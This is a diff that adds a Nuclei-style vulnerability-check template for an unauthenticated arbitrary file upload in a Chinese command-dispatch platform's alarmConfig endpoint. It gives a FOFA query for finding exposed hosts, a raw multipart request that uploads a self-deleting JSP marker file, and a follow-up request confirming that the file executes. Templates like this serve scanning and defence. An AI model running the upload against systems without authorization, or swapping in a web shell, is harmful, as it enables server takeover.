@@ -1,0 +1,43 @@
+id: visual-command-platform-alarmconfig-file-upload
+
+info:
+  name: "可视化融合指挥调度平台 alarmConfig 接口任意文件写入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="base/searchInfoWindow_min.cs
+      可视化融合指挥调度平台 alarmConfig 接口的文件上传功能未正确校验文件类型与路径，攻击者可通过该接口绕过身份验证机制，实现恶意文件上传，进而获取服务器控制权限。
+  tags: 可视化融合指挥调度平台
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /dispatch/alarm/alarmConfig/upload HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
+
+    ------WebKitFormBoundary7ctER307B0RaQwOp
+    Content-Disposition: form-data; name="file";filename="NTest.jsp"
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundary7ctER307B0RaQwOp--
+- raw:
+  - |
+    GET /media/temporaryFiles/NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
